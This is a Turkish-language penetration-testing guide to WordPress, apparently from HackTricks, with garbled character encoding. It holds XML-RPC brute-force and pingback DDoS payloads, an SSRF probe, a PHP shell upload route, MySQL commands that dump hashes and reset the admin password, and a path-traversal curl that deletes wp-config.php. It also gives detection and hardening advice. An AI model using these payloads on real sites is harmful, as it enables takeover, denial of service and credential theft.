# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **YÃ¼klenen** dosyalar ÅŸuraya gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Temalar dosyalarÄ± /wp-content/themes/ iÃ§inde bulunabilir,** bu nedenle RCE elde etmek iÃ§in temanÄ±n bazÄ± php dosyalarÄ±nÄ± deÄŸiÅŸtirirseniz muhtemelen bu yolu kullanacaksÄ±nÄ±z. Ã–rneÄŸin: **twentytwelve temasÄ±** kullanarak **404.php** dosyasÄ±na ÅŸuradan **eriÅŸebilirsiniz**: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **BaÅŸka bir yararlÄ± url olabilir:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** dosyasÄ±nda veritabanÄ±nÄ±n root ÅŸifresini bulabilirsiniz.
- Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress DosyalarÄ±**

- `index.php`
- `license.txt` WordPress'in kurulu versiyonu gibi yararlÄ± bilgiler iÃ§erir.
- `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±labilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP'nin taÅŸÄ±ma mekanizmasÄ± olarak ve XML'nin kodlama mekanizmasÄ± olarak iÅŸlev gÃ¶rdÃ¼ÄŸÃ¼ WordPress'in bir Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r bir iletiÅŸim, WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
- `wp-content` klasÃ¶rÃ¼, eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` Platforma yÃ¼klenen dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` Sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-sitemap.xml` WordPress sÃ¼rÃ¼mleri 5.5 ve Ã¼zeri, tÃ¼m kamuya aÃ§Ä±k gÃ¶nderiler ve kamuya sorgulanabilir gÃ¶nderi tÃ¼rleri ve taksonomiler ile bir sitemap XML dosyasÄ± oluÅŸturur.

**SonrasÄ± istismar**

- `wp-config.php` dosyasÄ±, WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in ihtiyaÃ§ duyduÄŸu verileri iÃ§erir; veritabanÄ± adÄ±, veritabanÄ± sunucusu, kullanÄ±cÄ± adÄ± ve ÅŸifre, kimlik doÄŸrulama anahtarlarÄ± ve tuzlar ile veritabanÄ± tablo Ã¶n eki. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu etkinleÅŸtirmek iÃ§in de kullanÄ±labilir, bu da sorun gidermede yararlÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

- **YÃ¶netici**
- **EditÃ¶r**: Kendi ve baÅŸkalarÄ±nÄ±n gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Yazar**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **KatkÄ±da Bulunan**: Kendi gÃ¶nderilerini yazar ve yÃ¶netir ancak yayÄ±nlayamaz
- **Abone**: GÃ¶nderileri tarar ve profilini dÃ¼zenler

## **Pasif SÄ±ralama**

### **WordPress sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenin**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±zÄ± kontrol edin.

SayfanÄ±n **kaynak kodu** iÃ§inde (Ã¶rnek [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/) adresinden):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS baÄŸlantÄ± dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

### Eklentileri Al
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± AlÄ±n
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel Olarak SÃ¼rÃ¼mleri Ã‡Ä±karma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif Enumerasyon

### Eklentiler ve Temalar

Muhtemelen tÃ¼m Eklentileri ve TemalarÄ± bulamayacaksÄ±nÄ±z. Hepsini keÅŸfetmek iÃ§in, **Eklentiler ve Temalar listesini Aktif olarak Brute Force yapmanÄ±z** gerekecek (umarÄ±z bizim iÃ§in bu listeleri iÃ§eren otomatik araÃ§lar var).

### KullanÄ±cÄ±lar

- **ID Brute:** Bir WordPress sitesinden geÃ§erli kullanÄ±cÄ±larÄ± Brute Force ile kullanÄ±cÄ± ID'lerini alarak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
EÄŸer yanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. EÄŸer yanÄ±t **400** ise, o zaman id **geÃ§ersiz**dir.

- **wp-json:** KullanÄ±cÄ±lar hakkÄ±nda bilgi almak iÃ§in ÅŸunu sorgulamayÄ± da deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
BaÅŸka bir `/wp-json/` uÃ§ noktasÄ±, kullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgileri aÃ§Ä±ÄŸa Ã§Ä±karabilir:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Bu uÃ§ noktanÄ±n yalnÄ±zca bir gÃ¶nderi yapmÄ±ÅŸ kullanÄ±cÄ±larÄ± aÃ§Ä±ÄŸa Ã§Ä±kardÄ±ÄŸÄ±nÄ± unutmayÄ±n. **Bu Ã¶zelliÄŸi etkinleÅŸtiren kullanÄ±cÄ±lar hakkÄ±nda yalnÄ±zca bilgi saÄŸlanacaktÄ±r**.

AyrÄ±ca **/wp-json/wp/v2/pages** IP adreslerini sÄ±zdÄ±rabilir.

- **GiriÅŸ kullanÄ±cÄ± adÄ± sayÄ±mÄ±**: **`/wp-login.php`**'da giriÅŸ yaparken **mesaj** **farklÄ±dÄ±r** eÄŸer belirtilen **kullanÄ±cÄ± adÄ± mevcutsa veya deÄŸilse**.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse, kimlik bilgileri iÃ§in bir brute-force saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir veya bunu diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (Bu sÃ¼reci otomatikleÅŸtirmek iÃ§in [bunu](https://github.com/relarizky/wpxploit) kullanabilirsiniz, Ã¶rneÄŸin).

Aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in _**/xmlrpc.php**_ adresine eriÅŸmeyi deneyin ve bu isteÄŸi gÃ¶nderin:

**Kontrol Et**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Kimlik Bilgileri Kaba Kuvvet**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** kimlik bilgilerini kaba kuvvetle kÄ±rmak iÃ§in kullanÄ±labilecek bazÄ± yÃ¶ntemlerdir. EÄŸer bunlardan herhangi birini bulursanÄ±z, ÅŸÃ¶yle bir ÅŸey gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Mesaj _"GeÃ§ersiz kullanÄ±cÄ± adÄ± veya ÅŸifre"_ 200 kodlu bir yanÄ±t iÃ§inde, kimlik bilgileri geÃ§erli deÄŸilse gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
AyrÄ±ca, aynÄ± istekte birkaÃ§ kimlik bilgisi denemek iÃ§in **`system.multicall`** kullanarak kimlik bilgilerini brute-force yapmanÄ±n **daha hÄ±zlÄ± bir yolu** vardÄ±r:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA'yÄ± Atlatma**

Bu yÃ¶ntem programlar iÃ§in tasarlanmÄ±ÅŸtÄ±r ve insanlar iÃ§in deÄŸil, ayrÄ±ca eski olduÄŸu iÃ§in 2FA'yÄ± desteklemez. Yani, geÃ§erli kimlik bilgilerine sahipseniz ancak ana giriÅŸ 2FA ile korunuyorsa, **bu kimlik bilgileriyle 2FA'yÄ± atlayarak giriÅŸ yapmak iÃ§in xmlrpc.php'yi kÃ¶tÃ¼ye kullanabilirsiniz**. Konsoldan yapabileceÄŸiniz tÃ¼m eylemleri gerÃ§ekleÅŸtiremeyeceÄŸinizi unutmayÄ±n, ancak Ippsec'in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) aÃ§Ä±klamasÄ±nda olduÄŸu gibi RCE'ye ulaÅŸmanÄ±z hala mÃ¼mkÃ¼n olabilir.

**DDoS veya port taramasÄ±**

EÄŸer listede _**pingback.ping**_ yÃ¶ntemini bulursanÄ±z, Wordpress'in herhangi bir host/port'a keyfi bir istek gÃ¶ndermesini saÄŸlayabilirsiniz.\
Bu, **binlerce** Wordpress **sitesinin** bir **konuma** **eriÅŸmesini** istemek iÃ§in kullanÄ±labilir (bu durumda o konumda bir **DDoS** meydana gelir) veya **Wordpress**'in bazÄ± iÃ§ **aÄŸlarÄ±** **taramasÄ±nÄ±** saÄŸlamak iÃ§in kullanabilirsiniz (herhangi bir portu belirtebilirsiniz).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan **bÃ¼yÃ¼k** (17) ise, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Bu yÃ¶ntemi DDoS oluÅŸturmak iÃ§in nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in Ã¶nceki bÃ¶lÃ¼mdeki **`system.multicall`** kullanÄ±mÄ±na bakÄ±n.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶kÃ¼nde bulunur: **`/wp-cron.php`**\
Bu dosya **eriÅŸildiÄŸinde** "aÄŸÄ±r" bir MySQL **sorgusu** gerÃ§ekleÅŸtirilir, bu nedenle **saldÄ±rganlar** tarafÄ±ndan bir **DoS** **oluÅŸturmak** iÃ§in kullanÄ±labilir.\
AyrÄ±ca, varsayÄ±lan olarak, `wp-cron.php` her sayfa yÃ¼klemesinde (bir istemci herhangi bir Wordpress sayfasÄ±nÄ± talep ettiÄŸinde) Ã§aÄŸrÄ±lÄ±r, bu da yÃ¼ksek trafikli sitelerde sorunlara neden olabilir (DoS).

Wp-Cron'un devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± ve gerekli eylemleri dÃ¼zenli aralÄ±klarla gerÃ§ekleÅŸtiren gerÃ§ek bir cronjob'un host iÃ§inde oluÅŸturulmasÄ± Ã¶nerilir (sorun yaratmadan).

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ adresine eriÅŸmeyi deneyin ve Wordpress sitesi size bir istek gÃ¶nderebilir.

Bu Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nda alÄ±nan yanÄ±t:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§, **methodName: pingback.ping** ve **/wp-json/oembed/1.0/proxy** yolunu kontrol eder ve eÄŸer mevcutsa, bunlarÄ± istismar etmeye Ã§alÄ±ÅŸÄ±r.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti Ã¼zerine yazarak eriÅŸim elde et

GerÃ§ek bir saldÄ±rÄ±dan Ã§ok bir merak. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndan 1 biti deÄŸiÅŸtirebilirsiniz. BÃ¶ylece `/var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumunu NOP (`!`) iÅŸlemini devre dÄ±ÅŸÄ± bÄ±rakmak iÃ§in deÄŸiÅŸtirebilirsiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadan bir php'yi deÄŸiÅŸtirme (admin kimlik bilgileri gerekli)**

GÃ¶rÃ¼nÃ¼m â†’ Tema DÃ¼zenleyici â†’ 404 Åablonu (saÄŸda)

Bir php shell iÃ§in iÃ§eriÄŸi deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

Bu gÃ¼ncellenmiÅŸ sayfaya nasÄ±l eriÅŸebileceÄŸinizi internette arayÄ±n. Bu durumda buraya eriÅŸmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Eklenti RCE

### PHP eklentisi

Eklenti olarak .php dosyalarÄ± yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin, php backdoor'unuzu oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir eklenti ekleyin:

![](<../../images/image (722).png>)

Eklentiyi yÃ¼kleyin ve Åimdi YÃ¼kle'ye basÄ±n:

![](<../../images/image (249).png>)

Devam et'e tÄ±klayÄ±n:

![](<../../images/image (70).png>)

Muhtemelen bu gÃ¶rÃ¼nÃ¼ÅŸte hiÃ§bir ÅŸey yapmayacak, ancak Medya'ya giderseniz, yÃ¼klediÄŸiniz shell'i gÃ¶receksiniz:

![](<../../images/image (462).png>)

EriÅŸim saÄŸlayÄ±n ve ters shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'yi gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### KÃ¶tÃ¼ niyetli eklentiyi yÃ¼kleme ve etkinleÅŸtirme

Bu yÃ¶ntem, bilinen bir zafiyete sahip kÃ¶tÃ¼ niyetli bir eklentinin yÃ¼klenmesini iÃ§erir ve bir web shell elde etmek iÃ§in istismar edilebilir. Bu sÃ¼reÃ§, WordPress kontrol paneli aracÄ±lÄ±ÄŸÄ±yla aÅŸaÄŸÄ±daki gibi gerÃ§ekleÅŸtirilir:

1. **Eklenti Edinme**: Eklenti, Exploit DB gibi bir kaynaktan temin edilir [**buradan**](https://www.exploit-db.com/exploits/36374).
2. **Eklenti YÃ¼kleme**:
- WordPress kontrol paneline gidin, ardÄ±ndan `Kontrol Paneli > Eklentiler > Eklenti YÃ¼kle` seÃ§eneÄŸine gidin.
- Ä°ndirilen eklentinin zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Eklenti EtkinleÅŸtirme**: Eklenti baÅŸarÄ±yla yÃ¼klendikten sonra, kontrol paneli aracÄ±lÄ±ÄŸÄ±yla etkinleÅŸtirilmelidir.
4. **Ä°stismar**:
- "reflex-gallery" eklentisi yÃ¼klendiÄŸinde ve etkinleÅŸtirildiÄŸinde, bilinen bir zafiyet olduÄŸu iÃ§in istismar edilebilir.
- Metasploit Ã§erÃ§evesi, bu zafiyet iÃ§in bir istismar saÄŸlar. Uygun modÃ¼lÃ¼ yÃ¼kleyerek ve belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak, meterpreter oturumu oluÅŸturulabilir ve siteye yetkisiz eriÅŸim saÄŸlanabilir.
- Bunun, bir WordPress sitesini istismar etmenin birÃ§ok yÃ¶nteminden sadece biri olduÄŸu belirtilmektedir.

Ä°Ã§erik, eklentiyi yÃ¼kleme ve etkinleÅŸtirme adÄ±mlarÄ±nÄ± gÃ¶steren gÃ¶rsel yardÄ±mlar iÃ§ermektedir. Ancak, bu ÅŸekilde zafiyetleri istismar etmenin yasal izin olmadan yasadÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ± olduÄŸunu belirtmek Ã¶nemlidir. Bu bilgi, yalnÄ±zca yasal bir baÄŸlamda, aÃ§Ä±k izinle penetrasyon testi gibi sorumlu bir ÅŸekilde kullanÄ±lmalÄ±dÄ±r.

**Daha ayrÄ±ntÄ±lÄ± adÄ±mlar iÃ§in kontrol edin:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS'den RCE'ye

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_, **Cross-Site Scripting (XSS)** zafiyetini **Remote Code Execution (RCE)** veya diÄŸer kritik zafiyetlere yÃ¼kseltmek iÃ§in tasarlanmÄ±ÅŸ bir betiktir. Daha fazla bilgi iÃ§in [**bu gÃ¶nderiye**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) bakÄ±n. **WordPress SÃ¼rÃ¼mleri 6.X.X, 5.X.X ve 4.X.X iÃ§in destek saÄŸlar ve ÅŸunlarÄ± yapmanÄ±za olanak tanÄ±r:**
- _**Yetki YÃ¼kseltme:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Ã–zel Eklenti (backdoor) YÃ¼kleme:**_ Ã–zel eklentinizi (backdoor) WordPress'e yÃ¼kleyin.
- _**(RCE) YerleÅŸik Eklenti DÃ¼zenleme:**_ WordPress'teki YerleÅŸik Eklentileri dÃ¼zenleyin.
- _**(RCE) YerleÅŸik Tema DÃ¼zenleme:**_ WordPress'teki YerleÅŸik TemalarÄ± dÃ¼zenleyin.
- _**(Ã–zel) Ã–zel Ä°stismarlar:**_ ÃœÃ§Ã¼ncÃ¼ Taraf WordPress Eklentileri/Tema iÃ§in Ã–zel Ä°stismarlar.

## Ä°stismar SonrasÄ±

KullanÄ±cÄ± adlarÄ±nÄ± ve ÅŸifreleri Ã§Ä±karÄ±n:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
YÃ¶netici ÅŸifresini deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Eklentileri Pentest

### SaldÄ±rÄ± YÃ¼zeyi

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini bilmek, iÅŸlevselliÄŸindeki zayÄ±flÄ±klarÄ± bulmak iÃ§in anahtardÄ±r. Bir eklentinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini aÅŸaÄŸÄ±daki madde iÅŸaretlerinde ve [**bu blog yazÄ±sÄ±nda**](https://nowotarski.info/wordpress-nonce-authorization/) bazÄ± zayÄ±f eklenti Ã¶rneklerinde bulabilirsiniz.

- **`wp_ajax`**

Bir eklentinin iÅŸlevleri kullanÄ±cÄ±lara aÃ§Ä±ÄŸa Ã§Ä±karmanÄ±n yollarÄ±ndan biri AJAX iÅŸleyicileri aracÄ±lÄ±ÄŸÄ±yladÄ±r. Bu iÅŸleyiciler, mantÄ±k, yetkilendirme veya kimlik doÄŸrulama hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu iÅŸlevlerin genellikle hem kimlik doÄŸrulama hem de yetkilendirmeyi, **herhangi bir kullanÄ±cÄ± tarafÄ±ndan Wordpress Ã¶rneÄŸinde sahip olunabilecek** bir wordpress nonce'un varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± sÄ±k rastlanan bir durumdur (rolÃ¼nden baÄŸÄ±msÄ±z olarak).

Bir eklentide bir iÅŸlevi aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in kullanÄ±labilecek iÅŸlevler ÅŸunlardÄ±r:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ±, uÃ§ noktanÄ±n herhangi bir kullanÄ±cÄ± (hatta kimliÄŸi doÄŸrulanmamÄ±ÅŸ olanlar) tarafÄ±ndan eriÅŸilebilir olmasÄ±nÄ± saÄŸlar.**

> [!CAUTION]
> AyrÄ±ca, eÄŸer fonksiyon sadece kullanÄ±cÄ±nÄ±n yetkilendirmesini `wp_verify_nonce` fonksiyonu ile kontrol ediyorsa, bu fonksiyon genellikle kullanÄ±cÄ±nÄ±n giriÅŸ yapÄ±p yapmadÄ±ÄŸÄ±nÄ± kontrol eder, kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ kontrol etmez. Bu nedenle, dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± eylemlere eriÅŸim saÄŸlayabilir.

- **REST API**

AyrÄ±ca, `register_rest_route` fonksiyonunu kullanarak wordpress'ten fonksiyonlarÄ± bir rest AP ile aÃ§mak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback`, belirli bir kullanÄ±cÄ±nÄ±n API yÃ¶ntemini Ã§aÄŸÄ±rma yetkisine sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir geri Ã§aÄŸÄ±rma iÅŸlevidir.

**EÄŸer yerleÅŸik `__return_true` iÅŸlevi kullanÄ±lÄ±rsa, kullanÄ±cÄ± izinleri kontrolÃ¼ atlanacaktÄ±r.**

- **PHP dosyasÄ±na doÄŸrudan eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve eklentiler iÃ§indeki dosyalar web Ã¼zerinden doÄŸrudan eriÅŸilebilir. Bu nedenle, bir eklenti, dosyaya eriÅŸim saÄŸlanarak tetiklenen herhangi bir savunmasÄ±z iÅŸlevsellik sunuyorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan istismar edilebilir.

### wp_ajax_nopriv aracÄ±lÄ±ÄŸÄ±yla Kimlik DoÄŸrulamasÄ± Olmadan Rastgele Dosya Silme (Litho Tema <= 3.0)

WordPress temalarÄ± ve eklentileri sÄ±klÄ±kla `wp_ajax_` ve `wp_ajax_nopriv_` kancalarÄ± aracÄ±lÄ±ÄŸÄ±yla AJAX iÅŸleyicileri sunar. **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **geri Ã§aÄŸÄ±rma kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu nedenle herhangi bir hassas eylem ayrÄ±ca ÅŸunlarÄ± uygulamalÄ±dÄ±r:

1. Bir **yetki kontrolÃ¼** (Ã¶rneÄŸin, `current_user_can()` veya en azÄ±ndan `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doÄŸrulanan bir **CSRF nonce**, ve
3. **SÄ±kÄ± girdi temizleme / doÄŸrulama**.

Litho Ã§ok amaÃ§lÄ± temasÄ± (< 3.1) *Font Ailesini KaldÄ±r* Ã¶zelliÄŸinde bu 3 kontrolÃ¼ unuttu ve aÅŸaÄŸÄ±daki kodu (basitleÅŸtirilmiÅŸ) gÃ¶nderdi:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parÃ§asÄ±nÄ±n neden olduÄŸu sorunlar:

* **Kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ eriÅŸim** â€“ `wp_ajax_nopriv_` kancasÄ± kaydedilmiÅŸtir.
* **Nonce / yetki kontrolÃ¼ yok** â€“ herhangi bir ziyaretÃ§i uÃ§ noktayÄ± kullanabilir.
* **Yol sanitizasyonu yok** â€“ kullanÄ±cÄ± tarafÄ±ndan kontrol edilen `fontfamily` dizesi, filtreleme olmadan bir dosya sistemi yoluna eklenir ve klasik `../../` geÃ§iÅŸine izin verir.

#### SÃ¶mÃ¼rÃ¼

Bir saldÄ±rgan, tek bir HTTP POST isteÄŸi gÃ¶ndererek **yÃ¼klemeler ana dizininin altÄ±nda** (normalde `<wp-root>/wp-content/uploads/`) herhangi bir dosyayÄ± veya dizini silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Ã‡Ã¼nkÃ¼ `wp-config.php` *uploads* dÄ±ÅŸÄ±nda yer alÄ±r, varsayÄ±lan bir kurulumda dÃ¶rt `../` dizini yeterlidir. `wp-config.php` dosyasÄ±nÄ± silmek, WordPress'i bir sonraki ziyarette *kurulum sihirbazÄ±* moduna zorlar ve tam bir site ele geÃ§irme olanaÄŸÄ± saÄŸlar (saldÄ±rgan yalnÄ±zca yeni bir DB yapÄ±landÄ±rmasÄ± saÄŸlar ve bir admin kullanÄ±cÄ±sÄ± oluÅŸturur).

DiÄŸer etkili hedefler arasÄ±nda gÃ¼venlik eklentilerini kÄ±rmak iÃ§in eklenti/tema `.php` dosyalarÄ± veya `.htaccess` kurallarÄ± bulunmaktadÄ±r.

#### Tespit kontrol listesi

* Dosya sistemi yardÄ±mcÄ±larÄ±nÄ± Ã§aÄŸÄ±ran herhangi bir `add_action( 'wp_ajax_nopriv_...')` geri Ã§aÄŸrÄ±sÄ± (`copy()`, `unlink()`, `$wp_filesystem->delete()`, vb.).
* Yollar iÃ§ine temizlenmemiÅŸ kullanÄ±cÄ± girdisinin birleÅŸtirilmesi ( `$_POST`, `$_GET`, `$_REQUEST`'i arayÄ±n).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()`'Ä±n yokluÄŸu.

#### GÃ¼Ã§lendirme
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

